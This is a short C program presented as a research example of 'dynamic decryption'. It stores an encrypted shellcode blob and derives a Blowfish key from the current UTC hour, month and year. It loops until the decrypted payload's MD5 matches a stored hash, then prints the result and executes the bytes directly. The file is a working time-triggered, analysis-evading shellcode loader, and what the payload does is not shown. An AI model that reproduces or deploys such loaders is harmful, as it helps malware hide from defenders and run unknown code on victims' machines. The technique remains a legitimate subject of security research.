/* Dynamic decrytion procedure example - (c) 2005 - 2006 Omar A. Herrera Reyna
   This code is released under GNU General Public License v3.0
*/

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <openssl/blowfish.h> /*Openssl Blowfish encryption functions*/
#include <openssl/md5.h> /*Openssl MD5 hashing functions*/
#include <windows.h> /*Required for use with Sleep()*/
#define SCODE_SIZE 172+8
void (* shell)();
/* will use gmtime to derive the key
struct tm {
	int tm_sec; seconds after the minute (from 0)
	int tm_min; minutes after the hour (from 0)
	int tm_hour; hour of the day (from 0)
	int tm_mday; day of the month (from 1)
	int tm_mon; month of the year (from 0)
	int tm_year; years since 1900 (from 0)
	int tm_wday; days since Sunday (from 0)
	int tm_yday; day of the year (from 0)
	int tm_isdst; Daylight Saving Time flag
}; */
int main(int argc, char *argv[])
{ /* key, IV must be 8 byte blocks */
	time_t rawtime;
	struct tm * gmt;
	int cont;
	unsigned char decryptedPayload[SCODE_SIZE+10];
	unsigned char keyTime[8];
	/*We will only use 4 bytes: 1 byte frome the hour, 1 from the month and 2
	from the year, and then duplicate to get 8 bytes for XORing to get the key:
	DD MM Y1 Y2 DD MM Y1 Y2*/
	unsigned char key[8]; /*Blowfish Derived key from keyTime XOR keyXOR*/
	unsigned char ivec[8]={0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0}; /*Initial vector*/
	unsigned char decryptedMD5Hash [16];
	unsigned char scodeMD5Hash[]={0x81,0xED,0xD3,0x62,0xC6,0xE3,0x89,0x4F,0xD5,0xA5,
		0x6C,0x95,0xCE,0x55,0x25,0xE0};
	unsigned char keyXOR[8]={0x0F,0x20,0x6A,0x04,0x10,0x0D,0x6E,0x08};
	BF_KEY sched;
	unsigned char encryptedPayload[SCODE_SIZE+10] = {
		0xD7,0x5A,0x9A,0x75,0x12,0x8C,0x44,0xC0,0xC3,0xEB,0xBC,0x32,0x86,0xD8,0xB2,0xD4,
		0xAF,0xB6,0x36,0xB4,0x24,0x4D,0x7F,0x2F,0x6D,0x70,0x32,0xA7,0xDD,0xCC,0xAB,0x0C,
		0x5F,0x9E,0x79,0x26,0x70,0xA5,0x6F,0xAC,0xB4,0xB6,0x71,0x13,0xBE,0xDB,0xDA,0x0F,
		0xAD,0x1C,0x10,0x8D,0x31,0x18,0x34,0x5E,0xEA,0x74,0xC7,0xD2,0x55,0x86,0xB8,0xFA,
		0x40,0x47,0x0E,0x78,0xA5,0xAB,0x45,0x8E,0x08,0x0C,0xDA,0x68,0xD6,0x42,0x54,0x99,
		0xE6,0x54,0xA1,0xFC,0x48,0xAB,0xBA,0x9E,0x62,0x6D,0x52,0x3C,0x49,0xCA,0x2A,0xAB,
		0x63,0x0B,0xCD,0x1A,0x3C,0xF7,0x15,0x2E,0xB1,0x4D,0x15,0x11,0xEA,0x78,0x27,0x3B,
		0x33,0x81,0xD3,0x9D,0x8D,0x9B,0xE7,0xBB,0x0C,0xC5,0x97,0x8C,0x8E,0x38,0x49,0xE7,
		0xFD,0xAB,0x13,0x28,0x9F,0x45,0xAC,0x1C,0xE0,0x62,0xC3,0x82,0x47,0xB8,0x4A,0xA3,
		0xB0,0x14,0x2C,0xFA,0xC4,0xE1,0x51,0x6A,0x15,0x77,0xDF,0xA0,0x3F,0x24,0x98,0x36,
		0x7B,0x2D,0xC2,0x22,0x82,0x76,0x9A,0xBC,0x81,0xBF,0x09,0x01,0x9C,0xBE,0xB2,0x54,
		0xEB,0xF2,0xFC,0x7D,0xD1,0x77,0x44,0xDB,0x00,0x00,0x00,0x00,0x00,0x00};
	memset(decryptedPayload,'\0',SCODE_SIZE+10);
		do{
		Sleep(10000); /*This avoids overusing the CPU*/
		time(&rawtime);
		gmt=gmtime(&rawtime);
		keyTime[0]=((unsigned char) gmt->tm_hour);
		keyTime[1]=((unsigned char) gmt->tm_mon);
		keyTime[2]=((unsigned char) (gmt->tm_year));
		keyTime[3]=((unsigned char) ((gmt->tm_year)>>8));
		keyTime[4]=((unsigned char) gmt->tm_hour);
		keyTime[5]=((unsigned char) gmt->tm_mon);
		keyTime[6]=((unsigned char) (gmt->tm_year));
		keyTime[7]=((unsigned char) ((gmt->tm_year)>>8));
		key[0]=keyTime[0]^keyXOR[0];
		key[1]=keyTime[1]^keyXOR[1];
		key[2]=keyTime[2]^keyXOR[2];
		key[3]=keyTime[3]^keyXOR[3];
		key[4]=keyTime[4]^keyXOR[4];
		key[5]=keyTime[5]^keyXOR[5];
		key[6]=keyTime[6]^keyXOR[6];
		key[7]=keyTime[7]^keyXOR[7];
		/*Set Blowfish Key*/
		BF_set_key(&sched,8,key);
		BF_cbc_encrypt(encryptedPayload, decryptedPayload, /*Decrypt payload*/
			SCODE_SIZE,&sched,ivec,BF_DECRYPT);
		memset(decryptedMD5Hash,'\0',16);
		MD5(decryptedPayload+8, SCODE_SIZE-8,decryptedMD5Hash);
	} while (((unsigned long long) *decryptedMD5Hash!=
		(unsigned long long) *scodeMD5Hash)||
		((unsigned long long) *(decryptedMD5Hash+8)!=
		(unsigned long long) *(scodeMD5Hash+8)));
	printf("CORRECT KEY =%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\n",
		(unsigned char) key[0],(unsigned char) key[1],
		(unsigned char) key[2],(unsigned char) key[3],
		(unsigned char) key[4],(unsigned char) key[5],
		(unsigned char) key[6],(unsigned char) key[7]);
	printf("Encrypted SCODE is (salted): \n");
	for (cont=0;cont<SCODE_SIZE+10;cont++){
		printf("%.2X ",(unsigned char)encryptedPayload[cont]);
		if (((cont+1)%16)==0){
			printf("\n");}
	}
	printf("\nDecrypted SCODE (without salt) is: \n");
	for (cont=8;cont<SCODE_SIZE+10;cont++){
		printf("%.2X ",(unsigned char)decryptedPayload[cont]);
		if (((cont+1)%16)==0){
			printf("\n");}
	}
	shell= (void *) (decryptedPayload+8); /*skip salt and jump to decrypted code*/
	shell();
	return 0;
}
